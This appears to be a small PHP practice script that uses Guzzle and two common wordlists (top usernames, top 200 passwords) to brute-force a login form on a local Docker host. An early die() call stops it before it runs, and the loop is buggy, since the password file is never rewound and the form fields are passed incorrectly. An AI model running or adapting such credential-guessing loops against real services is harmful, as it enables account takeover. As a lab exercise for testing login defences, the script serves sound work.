<?php

use GuzzleHttp\Client as Guzzle;

require_once __DIR__ . '/../vendor/autoload.php';

$usernames = fopen('top-usernames-shortlist.txt', 'r');
$passwords = fopen('2020-200_most_used_passwords.txt', 'r');

$client = new Guzzle(['base_uri' => 'http://host.docker.internal:8989']);
$request = $client->request('GET', '/api');
$html = (string) $request->getBody();
echo $request->getStatusCode();
var_dump(htmlspecialchars($html));

die('shutdown');

while(!feof($usernames)) {
    $username = fgets($usernames);
    while(!feof($passwords)) {
        $password = fgets($passwords);
        echo 'DEBUG => username: ' . $username . ' - password: ' . $password . "<br>";
        $response = $client->request('POST', '/', [
            'username' => $username,
            'password' => $password
        ]);
    }
}

fclose($passwords);
fclose($usernames);
